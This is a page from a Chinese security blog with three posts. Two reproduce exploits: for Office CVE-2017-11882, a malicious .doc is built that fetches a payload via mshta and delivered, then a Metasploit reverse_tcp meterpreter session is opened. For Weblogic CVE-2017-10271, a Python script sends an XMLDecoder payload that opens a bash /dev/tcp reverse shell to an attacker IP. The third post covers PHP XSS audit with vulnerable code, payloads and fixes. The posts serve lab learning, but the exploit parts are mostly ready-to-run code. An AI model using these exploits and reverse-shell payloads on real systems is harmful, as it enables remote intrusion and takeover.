<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>shackle</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
  
  
  
  <meta property="og:type" content="website">
<meta property="og:title" content="shackle">
<meta property="og:url" content="https://shackles.top/page/2/index.html">
<meta property="og:site_name" content="shackle">
<meta property="og:locale" content="zh-CN">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="shackle">
  
    <link rel="alternate" href="/atom.xml" title="shackle" type="application/atom+xml">
  

  

  <link rel="icon" href="/css/images/mylogo1.jpg">
  <link rel="apple-touch-icon" href="/css/images/mylogo1.jpg">
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
  <style type="text/css">
/*    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}*/


  </style>
  <link rel="stylesheet" href="/css/style.css">

  <script src="/js/jquery-3.1.1.min.js"></script>
  <script src="/js/bootstrap.js"></script>

  <!-- Bootstrap core CSS -->
  <link rel="stylesheet" href="/css/bootstrap.css" >

  
    <link rel="stylesheet" href="/css/home.css" >
  

  

  

  
  
  

</head>



  <body>


  
    <header id="header">

	<!-- 背景图模式 -->
	

    
      <div id="intrologo" class="intro-logo" style="background-position:center; background-repeat:no-repeat; background-image: url(); background-size: auto 100%;">

      <!-- Support rolling -->  
        
        <section class="awSlider">
          <div class="carousel slide carousel-fade " data-ride="carousel">

            <!-- Wrapper for slides -->
            <div class="carousel-inner">
               
                  
                    <div class="item active">
                  
                    <img id="carousel-img0" src="http://osuq6jhys.bkt.clouddn.com/wqfe.jpg">
                  </div>

                  <!-- 自适应大图 -->
                  <script>
                      var img0 = new Image();
                      var imageTag0 = document.getElementById("carousel-img0");
                      img0.src = imageTag0.src;
                      img0.onload=function(){
                        if (img0.width / img0.height <= document.body.clientWidth / document.body.clientHeight) {
                          imageTag0.style.width = document.body.clientWidth + "px";
                        } else {
                          imageTag0.style.height = document.body.clientHeight + "px";
                          imageTag0.style.marginLeft = -(document.body.clientHeight * img0.width / img0.height - document.body.clientWidth) / 2 + "px";
                        }
                      };
                  </script>
                
                  
                    <div class="item">
                  
                    <img id="carousel-img1" src="https://source.unsplash.com/1920x1080/?nature">
                  </div>

                  <!-- 自适应大图 -->
                  <script>
                      var img1 = new Image();
                      var imageTag1 = document.getElementById("carousel-img1");
                      img1.src = imageTag1.src;
                      img1.onload=function(){
                        if (img1.width / img1.height <= document.body.clientWidth / document.body.clientHeight) {
                          imageTag1.style.width = document.body.clientWidth + "px";
                        } else {
                          imageTag1.style.height = document.body.clientHeight + "px";
                          imageTag1.style.marginLeft = -(document.body.clientHeight * img1.width / img1.height - document.body.clientWidth) / 2 + "px";
                        }
                      };
                  </script>
                
                  
                    <div class="item">
                  
                    <img id="carousel-img2" src="https://source.unsplash.com/collection/954550/1920x1080">
                  </div>

                  <!-- 自适应大图 -->
                  <script>
                      var img2 = new Image();
                      var imageTag2 = document.getElementById("carousel-img2");
                      img2.src = imageTag2.src;
                      img2.onload=function(){
                        if (img2.width / img2.height <= document.body.clientWidth / document.body.clientHeight) {
                          imageTag2.style.width = document.body.clientWidth + "px";
                        } else {
                          imageTag2.style.height = document.body.clientHeight + "px";
                          imageTag2.style.marginLeft = -(document.body.clientHeight * img2.width / img2.height - document.body.clientWidth) / 2 + "px";
                        }
                      };
                  </script>
                
            </div>

            <!-- Controls -->
            <a class="left carousel-control" href=".carousel" role="button" data-slide="prev">
              <span class="glyphicon glyphicon-chevron-left" aria-hidden="true"></span>
              <span class="sr-only">Geri</span>
            </a>
            <a class="right carousel-control" href=".carousel" role="button" data-slide="next">
              <span class="glyphicon glyphicon-chevron-right" aria-hidden="true"></span>
              <span class="sr-only">İleri</span>
            </a>
          </div>
        </section>
        <script>
          $('section.awSlider .carousel').carousel({
              pause: '',
              interval: 5000
          });
          var startImage = $('section.awSlider .item.active > img').attr('src');
          $('section.awSlider .carousel').on('slid.bs.carousel', function () {
              var bscn = $(this).find('.item.active > img').attr('src');
              $('section.awSlider > img').attr('src', bscn);
          });
        </script>
      

    
 


    <canvas width="100%" height="100%"></canvas>
    <script>
      var c = document.getElementsByTagName('canvas')[0],
          x = c.getContext('2d'),
          w = window.innerWidth,
          h = window.innerHeight,
          pr = window.devicePixelRatio || 1,
          f = 90,
          q,
          m = Math,
          r = 0,
          u = m.PI*2,
          v = m.cos,
          z = m.random
      c.width = w*pr
      c.height = h*pr
      x.scale(pr, pr)
      x.globalAlpha = 0.6

      <!-- 折线Polyline背景 -->
      
    </script>
    

    
      <div id="homelogo" class="homelogo" style="background: rgba(255,255,255,1);"> 
    

        
          <div class="homelogoback"  style="border: 1px solid #404040;" >
            <h1><a href="#content" id="logo">shackle</a></h1>
            <h3></h3>
            <h5>shackle</h5>
            <!-- <p><a href="https://github.com/iTimeTraveler" target="_blank">Github</a></p> -->
          </div>
        
    
    </div>
  </div>

  <!-- 自适应主页背景大图 -->
  

 <!-- home_logo_image居中 -->
 
    <script>
        var homelogodiv = document.getElementById("homelogo");
        if (document.all.homelogo.offsetWidth > document.body.clientWidth) {
          homelogodiv.style.width = document.body.clientWidth + "px";
          homelogodiv.style.marginLeft = document.body.clientWidth * -0.5 + "px";
        } else {
          homelogodiv.style.width = homelogodiv.clientWidth  + "px";
          homelogodiv.style.marginLeft = (homelogodiv.clientWidth)  * -0.5 + "px";
        }
    </script>
  

  <div class="intro-navigate">
      <p class="navigater-list">
        
          <a id="beautifont" class="main-nav-link" href="/">首页</a>
        
          <a id="beautifont" class="main-nav-link" href="/archives">归档</a>
        
          <a id="beautifont" class="main-nav-link" href="/about">关于</a>
        
      </p>
  </div>

</header>
  
  <div id="container">
    <div id="wrap">
      
            
      <div id="content" class="outer">
        
          <section id="main" style="float:none;">
  
    <article id="post-Office远程代码执行漏洞（CVE-2017-11882）"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2017/12/01/Office远程代码执行漏洞（CVE-2017-11882）/">Office远程代码执行漏洞（CVE-2017-11882）</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2017/12/01/Office远程代码执行漏洞（CVE-2017-11882）/" class="article-date">
	  <time datetime="2017-12-01T09:52:08.000Z" itemprop="datePublished">2017-12-01</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Office远程代码执行漏洞（CVE-2017-11882）"><a href="#Office远程代码执行漏洞（CVE-2017-11882）" class="headerlink" title="Office远程代码执行漏洞（CVE-2017-11882）"></a>Office远程代码执行漏洞（CVE-2017-11882）</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>&emsp;&emsp;2017年11月14日微软公司披露潜伏达<strong>17年之久</strong>的office远程代码执行漏洞（CVE-2017-11882）。CVE-2017-11882允许攻击者在当前用户的上下文中运行任意代码，导致无法正确处理内存中的对象，即为“ Microsoft Office Memory Corruption Vulnerability “，<strong>栈溢出的远程执行漏洞</strong>。</p>
<p>​    该漏洞是在EQNEDT32.EXE组件的缓冲区溢出导致。当受害用户打开Office文档时就有可能被漏洞利用，危害极大。 原因是由于EQNEDT32.EXE进程读入包含MathType的ole数据。函数给Font Name数据分配的大小是0x24个字节，超过大小会造成栈缓冲区溢出。而程序在拷贝公式Font Name数据时没有对其长度进行校验，从而导致漏洞发生。</p>
<p>通杀以下<strong>没有更新</strong>的Office版本：</p>
<p>Microsoft Office 2000</p>
<p>Microsoft Office 2003</p>
<p>Microsoft Office 2007 Service Pack 3</p>
<p>Microsoft Office 2010 Service Pack 2</p>
<p>Microsoft Office 2013 Service Pack 1</p>
<p>Microsoft Office 2016</p>
<p>MicrosoftOffice 365</p>
<p>具体漏洞分析内容详见以下链接：<br><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11882" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11882</a></p>
<p><a href="https://embedi.com/blog/skeleton-closet-ms-office-vulnerability-you-didnt-know-about/" target="_blank" rel="noopener">https://embedi.com/blog/skeleton-closet-ms-office-vulnerability-you-didnt-know-about/</a></p>
<p><a href="https://cert.360.cn/warning/detail?id=5373beff9f40ba6de88eb04c3b7c2455" target="_blank" rel="noopener">https://cert.360.cn/warning/detail?id=5373beff9f40ba6de88eb04c3b7c2455</a></p>
<p><a href="https://www.anquanke.com/post/id/87311" target="_blank" rel="noopener">https://www.anquanke.com/post/id/87311</a></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="第一步-漏洞验证"><a href="#第一步-漏洞验证" class="headerlink" title="第一步 漏洞验证"></a>第一步 漏洞验证</h3><p>&emsp;&emsp;登录kali攻击机，进入用户home文件中的CVE-2017-1182-payload目录。</p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180727/b8icLIKf9B.png?imageslim" alt="mark"></p>
<p>执行以下命令生成payload-cale.doc文件，为漏洞payload（漏洞利用程序），弹出计算机程序验证漏洞是否存在。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python CVE-2017-11882.py -c &quot;cmd.exe /c calc.exe&quot; -o payload-cale.doc</span><br></pre></td></tr></table></figure></p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180727/KlKHk314gI.png?imageslim" alt="mark"></p>
<p>接下来要把payload-cale.doc文件上传到windows靶机，受害者打开doc文件，漏洞执行利用。</p>
<p>登录windows靶机，打开FTP服务器。直接payload-cale.doc文件上传到此靶机上，真实环境下可利用社会工程学。</p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180727/b8Le52ee2g.png?imageslim" alt="mark"></p>
<p>打开FTP服务器。</p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180727/8ELED7HHmd.png?imageslim" alt="mark"></p>
<p>在kali攻击机登录ftp。输入账号密码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.0.40  [靶机IP地址]</span><br><span class="line">college   college@root</span><br></pre></td></tr></table></figure>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180727/FajJL8475F.png?imageslim" alt="mark"></p>
<p>上传到靶机上，上传目录是桌面。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">put payload-cale.doc</span><br></pre></td></tr></table></figure>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180727/2AdIEE1BbF.png?imageslim" alt="mark"></p>
<p>成功上传到靶机桌面上。</p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180727/3IGCFGijBH.png?imageslim" alt="mark"></p>
<p>点击payload-cale.doc文件可看到执行计算机弹窗效果，实验验证成功，说明靶机存在此漏洞。</p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180727/feieClHfEe.png?imageslim" alt="mark"></p>
<h3 id="第二步-漏洞利用"><a href="#第二步-漏洞利用" class="headerlink" title="第二步 漏洞利用"></a>第二步 漏洞利用</h3><p>在kali攻击机上启动msf  。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180727/fa84298f6f.png?imageslim" alt="mark"></p>
<p>查找CVE-2017-11882 漏洞(攻击机已经集成攻击程序)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search CVE-2017-11882</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/CVE-2017-11882</span><br></pre></td></tr></table></figure>
<p>设置payload为反弹tcp </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
<p>查看所需选项</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
<p>设置本机地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set lhost 192.168.0.23 [kali操作机地址]</span><br></pre></td></tr></table></figure>
<p>设置uri的路径<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set URIPATH payload</span><br></pre></td></tr></table></figure></p>
<p>运行payload,启动利用后，msf会监听本机8080端口，靶机访问192.168.0.23:8080/payload.doc，打开doc触发就会得到反弹到4444端口的tcp会话中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit -j</span><br></pre></td></tr></table></figure>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180727/Ce4E70D3l6.png?imageslim" alt="mark"></p>
<p>在/home/college/CVE-2017-11882-payload目录下中执行以下命令：生成 payload.doc </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python CVE-2017-11882.py -c &quot;mshta http://192.168.0.11[kali操作机地址]:8080 /payload&quot; -o payload.doc</span><br></pre></td></tr></table></figure>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180727/dFKk1Lf8fJ.png?imageslim" alt="mark"></p>
<p>同样通过ftp上传到桌面上，再点击执行 payload.doc 。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.0.40  [靶机IP地址]</span><br><span class="line">college   college@root</span><br><span class="line">put payload.doc</span><br></pre></td></tr></table></figure>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180727/KFADlLaIHD.png?imageslim" alt="mark"></p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180727/J2aAl6El0j.png?imageslim" alt="mark"></p>
<h3 id="第三步-后渗透阶段"><a href="#第三步-后渗透阶段" class="headerlink" title="第三步 后渗透阶段"></a>第三步 后渗透阶段</h3><p>可以看到成功反弹shell，session 1 进入meterpreter终端中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session 1</span><br></pre></td></tr></table></figure>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180727/9dDGmEj004.png?imageslim" alt="mark"></p>
<p>查看系统信息，如下。进一步可以使用meterpreter进行后渗透攻击。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysinfo</span><br></pre></td></tr></table></figure>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180727/7fj8f6GElC.png?imageslim" alt="mark"></p>

      
    </div>
    <footer class="article-footer">
      
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞复现/">漏洞复现</a></li></ul>

    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-weblogin反序列漏洞（CVE-2017-10271)"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2017/11/05/weblogin反序列漏洞（CVE-2017-10271)/">Weblogic 反序列化漏洞（CVE-2017-10271）</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2017/11/05/weblogin反序列漏洞（CVE-2017-10271)/" class="article-date">
	  <time datetime="2017-11-05T15:53:56.000Z" itemprop="datePublished">2017-11-05</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Weblogic-反序列化漏洞（CVE-2017-10271）"><a href="#Weblogic-反序列化漏洞（CVE-2017-10271）" class="headerlink" title="Weblogic 反序列化漏洞（CVE-2017-10271）"></a>Weblogic 反序列化漏洞（CVE-2017-10271）</h1><p>Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。</p>
<p>参考链接：</p>
<ul>
<li><a href="https://www.exploit-db.com/exploits/43458/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/43458/</a></li>
<li><a href="https://paper.seebug.org/487/" target="_blank" rel="noopener">https://paper.seebug.org/487/</a></li>
<li><a href="https://github.com/Tom4t0/Tom4t0.github.io/blob/master/_posts/2017-12-22-WebLogic%20WLS-WebServices%E7%BB%84%E4%BB%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.md" target="_blank" rel="noopener">https://github.com/Tom4t0/Tom4t0.github.io/blob/master/_posts/2017-12-22-WebLogic%20WLS-WebServices组件反序列化漏洞分析.md</a></li>
<li><a href="http://blog.diniscruz.com/2013/08/using-xmldecoder-to-execute-server-side.html" target="_blank" rel="noopener">http://blog.diniscruz.com/2013/08/using-xmldecoder-to-execute-server-side.html</a></li>
</ul>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180402/9agkkF85iF.png?imageslim" alt="mark"></p>
<p>nc 监听 21端口</p>
<p><img src="http://p6hx7t2q4.bkt.clouddn.com/blog/180402/g7lbLkGe4g.png?imageslim" alt="mark"></p>
<p>python3 批量利用脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">"Content-Type"</span>: <span class="string">"text/xml"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(url)</span>:</span></span><br><span class="line">    data = <span class="string">'''</span></span><br><span class="line"><span class="string">	&lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt; &lt;soapenv:Header&gt;</span></span><br><span class="line"><span class="string">	&lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;</span></span><br><span class="line"><span class="string">	&lt;java version="1.4.0" class="java.beans.XMLDecoder"&gt;</span></span><br><span class="line"><span class="string">	&lt;void class="java.lang.ProcessBuilder"&gt;</span></span><br><span class="line"><span class="string">	&lt;array class="java.lang.String" length="3"&gt;</span></span><br><span class="line"><span class="string">	&lt;void index="0"&gt;</span></span><br><span class="line"><span class="string">	&lt;string&gt;/bin/bash&lt;/string&gt;</span></span><br><span class="line"><span class="string">	&lt;/void&gt;</span></span><br><span class="line"><span class="string">	&lt;void index="1"&gt;</span></span><br><span class="line"><span class="string">	&lt;string&gt;-c&lt;/string&gt;</span></span><br><span class="line"><span class="string">	&lt;/void&gt;</span></span><br><span class="line"><span class="string">	&lt;void index="2"&gt;</span></span><br><span class="line"><span class="string">	&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.102/21 0&amp;gt;&amp;amp;1&lt;/string&gt;</span></span><br><span class="line"><span class="string">	&lt;/void&gt;</span></span><br><span class="line"><span class="string">	&lt;/array&gt;</span></span><br><span class="line"><span class="string">	&lt;void method="start"/&gt;&lt;/void&gt;</span></span><br><span class="line"><span class="string">	&lt;/java&gt;</span></span><br><span class="line"><span class="string">	&lt;/work:WorkContext&gt;</span></span><br><span class="line"><span class="string">	&lt;/soapenv:Header&gt;</span></span><br><span class="line"><span class="string">	&lt;soapenv:Body/&gt;</span></span><br><span class="line"><span class="string">	&lt;/soapenv:Envelope&gt;</span></span><br><span class="line"><span class="string">	'''</span></span><br><span class="line"></span><br><span class="line">    respond = requests.post(url=url, data=data, headers=headers)</span><br><span class="line">    <span class="keyword">if</span>(respond.status_code == <span class="number">500</span>):</span><br><span class="line">        print(<span class="string">'success'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    url = <span class="string">"http://192.168.1.101:7001/wls-wsat/CoordinatorPortType"</span></span><br><span class="line">    exp(url)</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞/">漏洞</a></li></ul>

    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-PHP 代码审计_知识点"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2017/10/20/PHP 代码审计_知识点/">PHP 代码审计_知识点</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2017/10/20/PHP 代码审计_知识点/" class="article-date">
	  <time datetime="2017-10-20T15:53:56.000Z" itemprop="datePublished">2017-10-20</time>
	</a>

      
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="PHP-代码审计-知识点"><a href="#PHP-代码审计-知识点" class="headerlink" title="PHP 代码审计_知识点"></a>PHP 代码审计_知识点</h1><p>来源于某大神~  感谢！</p>
<h2 id="1-XSS"><a href="#1-XSS" class="headerlink" title="1.XSS"></a>1.XSS</h2><h3 id="1-1反射型XSS"><a href="#1-1反射型XSS" class="headerlink" title="1.1反射型XSS"></a>1.1反射型XSS</h3><h4 id="0x01漏洞背景"><a href="#0x01漏洞背景" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>XSS攻击全称跨站脚本攻击，是为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在web应用中的计 算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。<br>非持久型跨站：反射型跨站脚本漏洞，最普遍的类型。</p>
<h4 id="0x02漏洞代码及分析"><a href="#0x02漏洞代码及分析" class="headerlink" title="0x02漏洞代码及分析"></a>0x02漏洞代码及分析</h4><ul>
<li>漏洞代码：</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">username = _GET[<span class="string">'user'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"用户名："</span>.$username;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>将用户输入的user内容直接输出到页面，未经过任何过滤。可导致XSS漏洞攻击</p>
<ul>
<li>payload</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?user=&lt;script&gt;alart(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h5 id="修复建议："><a href="#修复建议：" class="headerlink" title="-  修复建议："></a>-  修复建议：</h5><p>在接收输入后进行htmlspecialchars过滤，或者在输出前htmlspecialchars过滤</p>
<p>建议修复代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">username = _GET[<span class="string">'user'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"用户名："</span>.htmlspecialchars($username);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="1-2存储型XSS"><a href="#1-2存储型XSS" class="headerlink" title="1.2存储型XSS"></a>1.2存储型XSS</h3><h4 id="0x01漏洞背景-1"><a href="#0x01漏洞背景-1" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>XSS攻击全称跨站脚本攻击，是为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在web应用中的计 算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。<br>存储型跨站：危害大、恶意代码存储服务器(数据库)</p>
<h4 id="0x02漏洞代码及分析-1"><a href="#0x02漏洞代码及分析-1" class="headerlink" title="0x02漏洞代码及分析"></a>0x02漏洞代码及分析</h4><ul>
<li>漏洞代码：        </li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_POST[<span class="string">'content'</span>])) &#123;</span><br><span class="line">    $content = addslashes($_POST[<span class="string">'content'</span>]);</span><br><span class="line">    <span class="keyword">if</span> ($mysqli - &gt;query(<span class="string">"insert into test (content)values('$content')"</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'发言成功'</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'发言失败'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$data = $mysqli - &gt;query(<span class="string">"select content from test"</span>);</span><br><span class="line"><span class="keyword">if</span> ($data - &gt;num_rows !== <span class="string">'0'</span>) &#123;</span><br><span class="line">    $arr = $data - &gt;fetch_all();</span><br><span class="line">    <span class="keyword">foreach</span>($arr <span class="keyword">as</span> $a) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'发言：'</span>.$a[<span class="number">0</span>].<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>用户发言的内容未进行字符串编码，直接存储到数据库中，并取出数据库中带有恶意代码的内容输出到网页中，导致XSS攻击</p>
<ul>
<li>修复建议：</li>
</ul>
<p>在接收输入后进行htmlspecialchars过滤，或者在输出前htmlspecialchars过滤</p>
<p>建议修复代码：<br>echo ‘发言：’.htmlspecialchars($a[0]).’<br>‘;</p>
<h3 id="1-3-DOM-XSS"><a href="#1-3-DOM-XSS" class="headerlink" title="1.3 DOM XSS"></a>1.3 DOM XSS</h3><h4 id="0x01漏洞背景-2"><a href="#0x01漏洞背景-2" class="headerlink" title="0x01漏洞背景"></a>0x01漏洞背景</h4><p>XSS攻击全称跨站脚本攻击，是为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在web应用中的计 算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。<br>DOMXSS：一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞。</p>
<h4 id="0x02漏洞代码及分析-2"><a href="#0x02漏洞代码及分析-2" class="headerlink" title="0x02漏洞代码及分析"></a>0x02漏洞代码及分析</h4><p>漏洞代码1：</p>
